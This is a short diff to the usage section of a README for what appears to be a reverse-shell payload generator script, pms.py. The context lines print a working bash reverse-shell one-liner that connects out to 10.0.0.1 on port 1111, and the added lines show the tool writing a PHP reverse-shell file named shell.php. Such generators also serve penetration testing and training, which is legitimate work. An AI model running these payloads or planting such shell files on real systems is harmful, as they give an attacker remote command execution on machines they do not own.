@@ -24,3 +24,7 @@ Usage
 $ python3 pms.py --type bash
 bash -i >& /dev/tcp/10.0.0.1/1111 0>&1
 ```
+Get php reverse shell file
+```sh
+$ python3 pms.py --type php-rev > shell.php
+```
